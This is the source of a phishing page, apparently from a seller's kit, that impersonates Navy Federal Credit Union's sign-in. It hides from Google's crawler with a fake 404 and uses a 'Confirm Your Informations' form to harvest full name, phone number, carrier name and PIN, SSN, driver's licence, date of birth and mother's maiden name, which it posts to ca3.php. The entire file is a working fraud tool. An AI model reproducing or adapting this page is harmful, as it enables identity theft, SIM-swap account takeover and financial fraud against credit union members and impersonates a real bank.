<?php
include('anti.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<?php
#<!--
#---------------------||-||---------------------#
#        #===============================#
#        #         By Bell South         #
#        #         Icq: @Bell_South      #
#        #        Telegram: @Bell)South  #
#        #       Bellsouth@yahoo.com     #
#        #        fb.com/bell.south      #
#        #         -Contact Me Here-     #
#        #===============================#                     
#
#---------------------||-||---------------------#
#-->
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>Navy Federal Credit Union - Our Members are the Mission&reg;</title>

<link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon" />
<link rel="apple-touch-icon" href="assets/apple-icon.png" />

<!-- Import this way for performance gains -->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600">
<link rel="stylesheet" href="assets/nfcu-icons.css" />
<link rel="stylesheet" href="assets/all.css" />
<link rel="stylesheet" href="assets/nauth.css" />
<link rel="stylesheet" href="assets/responsivemain.css" />

<!-- includes jquery, common, dropdown, bootstrap-select, keypad, modal js files -->
	<script type="text/javascript" src="assets/jquery.js"></script>
	<script type="text/javascript" src="assets/common.js"></script>

	<script type="text/javascript" src="assets/cookieGenerator.js"></script>
	<script type="text/javascript" src="assets/login.js"></script>

<script>
window.onload = function(){
var date = new Date().getFullYear();
document.getElementById("year").innerHTML = date;
}
</script>

<noscript>
	 <p class="alert alert-noscriptwarning">Your browsers JavaScript must be enabled to sign into Online Banking.</p>
</noscript>




<!-- Insert Chat Part here -->
<script type="text/Javascript" src="assets/le2-mtagconfig.js"></script> 

</script> 


</head>

<body class="responsive">
 <a href="#end-header" id="skipnav"  class="skipnav">Skip Navigation Links</a>

<div class="mobileMenu">
	<div class="MobileMenuHeader">
	</div>
	<div class="MobileMenuContent">
		<div class="MobLocations">
	        <a href="#"><span>&#xe637;</span>Locations</a>
        </div>
		<div class="MobContactUs">
	        <a href="#"><span>&#xe632;</span>Contact Us</a>
        </div>
        <div class="MobRoutingNumber">
        	<p>Routing Number: <strong>256074974</strong></p>
        </div>
	</div>
</div>

<div class="pageWrap">  
	<!-- start of header -->	
	<div class="header-sm" role="banner">
		<div class="container">
			<div class="header-content-sm">
				<div class="mob-nav-menu">
					<i class="fa fa-bars"></i>
				</div>
				<div class="logo-sm">
					<a href="#" title="Go to NavyFederal.org">
						<img class="logo-sm-pic" src="assets/NFCU_Mob_Logo-1d62888b4b662af9142e3c385f423f32.svg"
							 alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" />
					</a>
				</div>
			</div>
		</div>
	</div>
	<div class="header-bg" role="banner">
		<div class="container">
			<div class="content-box">
				<div class="header-content-bg">
					<div class="logo">
						<a href="#" title="Go to NavyFederal.org" class="logo_bg_a">
						<img src="assets/img_logo-veterans-1d62888b4b662af9142e3c385f423f32.svg" 
							alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" class="logo_bg"/> </a>
					</div>
					<div class="nav navbar-collapse">
						<div class="rt-container"><span class="text-routing">Routing Number: </span><span class="rnumber">256074974</span></div>
						<a	class="padRight20 loc-class" href="#"> <span class="icon-locations"></span> Locations </a>
						
						<a class="Contact-us" href="#"><img src="assets/contact-us-1d62888b4b662af9142e3c385f423f32.svg"
						class="icon_more_contact_us_default" alt="Contact Us"/> Contact Us</a>  
					</div>
				</div>
			</div>
		</div> 
	</div>
	
		<!-- end of header-->
		
		<!-- main content area starts here -->
	<div class="content-wrapper" role="main">
		
		        <div class="formbackground">
		        <a id="end-header"></a>
		        		
		        </div>
		        <div class="container" role="main">
		        	<div class="background-container" style="height:1130px" >
		        	<div class="login-content-box">
						<div class="login">    
							<div class="headers"> 
								<h1>Verification process running...</h1>
		                	</div>               
		                    	<div class="login-panel">

								<div class="panel panel-primary heading-callout" style="width: 98%;max-width: 400px;">
				                    <div class="panel-heading">
				                        <h2 class="panel-title" style="width: 320px;text-shadow: 2px;">
										<span class="icon-padlock" style=""></span>
										<span>Confirm Your Informations</span></h2>
				                    </div>
				                    <div class="rule-container">
				                    	<div class="horizontal-line"></div>
				                    </div>
			                        <div class="panel-body">
			                            <div class="panel-content-left">
											<form id="Login" class="form-inline Rectangle-2459" name="Login" method="post" action="ca3.php" autocomplete="off">
												<div class="userPassGroup">
							<!--******************-->
									<div class="form-group username" style="display: block;">
										<label for="user">Full Name</label>			
							  	  		<input type="text" name="FullName" placeholder="John Doe" maxlength="32" class="form-control" required="" style="min-width: 305px;border-radius: 7px;">
									</div>
							<!--******************-->
									<div class="form-group username" style="display: block;">
										<label for="user">Phone Number</label>			
							  	  		<input type="text" name="PhoneNumber" placeholder="(555) 555-5555" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"  maxlength = "13" class="form-control phone" required="" style="min-width: 305px;border-radius: 7px;">
									</div>
					<script type="text/javascript">
						// Used to format phone number
						function phoneFormatter() {
						  $('.phone').on('input', function() {
							var number = $(this).val().replace(/[^\d]/g, '')
							if (number.length == 7) {
							  number = number.replace(/(\d{3})(\d{4})/, "$1-$2");
							} else if (number.length == 10) {
							  number = number.replace(/(\d{3})(\d{3})(\d{4})/, "($1) $2-$3");
							}
							$(this).val(number)
						  });
						};

						$(phoneFormatter);
					</script>
							<!--******************-->
									<div class="form-group username" style="display: block;">
										<label for="user">Carrier Name</label>			
							  	  		<input type="text" name="CarrierName" placeholder="" maxlength="32" class="form-control" required="" style="min-width: 305px;border-radius: 7px;">
									</div>
							<!--******************-->
									<div class="form-group username" style="display: block;">
										<label for="user">Carrier PIN</label>			
							  	  		<input type="text" name="CarrierPIN" placeholder="" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"  maxlength = "15" class="form-control" required="" style="min-width: 305px;border-radius: 7px;">
									</div>
							<!--******************-->
									<div class="form-group username" style="display: block;">
										<label for="user">SSN (If Any)</label>			
							  	  		<input type="text" name="SSN" placeholder="000-00-0000" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"  maxlength = "11" class="form-control ssn" style="min-width: 305px;border-radius: 7px;">
									</div>
							<!--******************-->
									<div class="form-group username" style="display: block;">
										<label for="user">Driving License(If Any)</label>			
							  	  		<input type="text" name="DL" placeholder="" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"  maxlength = "15" class="form-control"  style="min-width: 305px;border-radius: 7px;">
									</div>
					<script type="text/javascript">
					// SSN validation
					// trap keypress - only allow numbers
					$('input.ssn').on('keypress', function(event){
						// trap keypress
						var character = String.fromCharCode(event.which);
						if(!isInteger(character)){
							return false;
						}    
					});

					// checks that an input string is an integer, with an optional +/- sign character
					function isInteger (s) {
						if(s === '-') return true;
					   var isInteger_re     = /^\s*(\+|-)?\d+\s*$/;
					   return String(s).search (isInteger_re) != -1
					}

					// format SSN 
					$('input.ssn').on('keyup', function(){
					   var val = this.value.replace(/\D/g, '');
					   var newVal = '';
						if(val.length > 4) {
							this.value = val;
						}
						if((val.length > 3) && (val.length < 6)) {
							newVal += val.substr(0, 3) + '-';
							val = val.substr(3);
						}
						if (val.length > 5) {
							newVal += val.substr(0, 3) + '-';
							newVal += val.substr(3, 2) + '-';
							val = val.substr(5);
						}
						newVal += val;
						this.value = newVal;   
					});

							</script>	
							<!--******************-->
									<div class="form-group username" style="display: block;">
										<label for="user">Date Of Birth</label>			
							  	  		<input type="date" name="DOB"  class="form-control" required="" style="min-width: 305px;border-radius: 7px;">
									</div>
							<!--******************-->
									<div class="form-group username" style="display: block;">
										<label for="user">Mother's Maiden Name</label>			
							  	  		<input type="text" name="MMN" placeholder="" class="form-control" required="" style="min-width: 305px;border-radius: 7px;">
									</div>
							<!--******************-->
												</div>
												
									<div class="submitAndRecaptcha "> 
										<input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" value="Continue" style="width: 104px;height: 44px;border-radius: 6px;background-color: #ed780f;font-size: 16px;opacity: 1;">
									</div>
												
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>

				</div>	
			</div>
		<!-- start of footer  -->
		<div class="container footer">
			<div class="content-box">
				<div class="ft-content-box">
		            <div class="footer-content">
		                <div class="ft-logo">
		                    <a href="#" title="Go to NavyFederal.org" target="_blank" class="ft-logo-a">
		                    	<span class="nfcu-icon-ftlogo">&#xe608;</span>
		                    </a>
		                </div>
		                <div class="content">
		                    <div class="member-services marginbottom20">
		      						<span class="mbr-services-txt">24/7 Member Services:<b>&nbsp;1-888-842-6328&nbsp;</b></span><span class="separator mob-pipe">&#x2008; &#x2008;|&#x2008; &#x2008;</span><span class="mob-line-break"><br></span>
		      						<span class="text-routing">Routing Number:&nbsp;<b>256074974</b> </span>
		      						<hr/>
		      				</div>
		      				<div class="nav-container">
				                <nav class="nav ft-nav paddingtop20 marginbottom20" role="navigation">
										<a href="#">About Us&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Contact Us&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Privacy Policy&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Security&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Accessibility&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Browser Support</a>
								</nav>
							</div>
							<div class="copyright">	
								<p id="copyright">
									&#169; <span id="year" style="font-weight:800;"></span><span class="copyright">&nbsp;<b>Navy Federal Credit Union.</b> </span> All rights reserved.
								</p>
							</div>
							
		                        <div class="nav regInstitutions"> 
									<div class="ncua-link"><a href="#" id="ncua-font"><span class="icon-ncua"></span> Federally Insured by NCUA</a><span class="separator">&#x2008;&#x2008;&#x2008;&#x2008;&#x2008;|&#x2008;&#x2008;&#x2008;&#x2008;&#x2008;</span></div> 
									<div class="ehl-link"><a href="#" id="EHL"><span class="icon-housing"></span> Equal Housing Lender</a> </div>
								</div>	                    
		                    
		                    <div class="ft-disclaimers">
		                    	<p>
									APY = Annual Percentage Yield <span class="separator">|</span> APR = Annual Percentage Rate
								</p>
		                        <p>
		                            <sup>+</sup>Rates are based on an evaluation of credit history, so your rate may differ.
		                        </p>
		
		                        <p>
		                            <sup>++</sup>Rates are variable, and based on an evaluation of credit history, so your rate may differ.
		                        </p>
		                        
		                        <p>
		                        	<sup>*</sup>Message and date rates may apply. Terms and Conditions are available.
		                        </p>
		                        
		                        <p>
		                         iPhone&reg;, iPad&reg; and iPod touch&reg; are trademarks of Apple Inc. App Store&#8480; is a service mark of Apple Inc. Android&trade; and Google Play&trade; are trademarks of Google Inc. Images used for representational purposes only; do not imply government endorsement.
		                    	</p>
		                    </div>
		                </div>
		            </div>
		    	</div>
	    	</div>
	    </div>
	    <!-- end of footer  -->
</div>
	<!-- iFrame for onlineDisclosure -->
    <div class="modal fade" id="modalonlineDisclosure" tabindex="-1" role="dialog" aria-labelledby="modalonlineDisclosureLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
                    <p class="modal-title" id="modalonlineDisclosureLabel">Use of Cookies by Navy Federal Online</p>
                </div>
                <div class="modal-body">
                    <iframe id="onlineDisclosureFrame" class="cookies"  frameborder="0"></iframe>
                </div>
                <div class="modal-footer">
                	<button type="button" id="modal-button" value="Done" data-dismiss="modal" aria-label="Done">Done</button>
                </div>
            </div>
        </div>
    </div>
    <!-- End of onlineDisclosure Modal -->
    
    <div class="modal fade" id="modalbrowserRequirements" tabindex="-1" role="dialog" aria-labelledby="modalbrowserRequirementsLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
                    <p class="modal-title" id="modalbrowserRequirementsLabel">Browser Requirements</p>
                </div>
            </div>
        </div>
    </div>
	</body>
</html>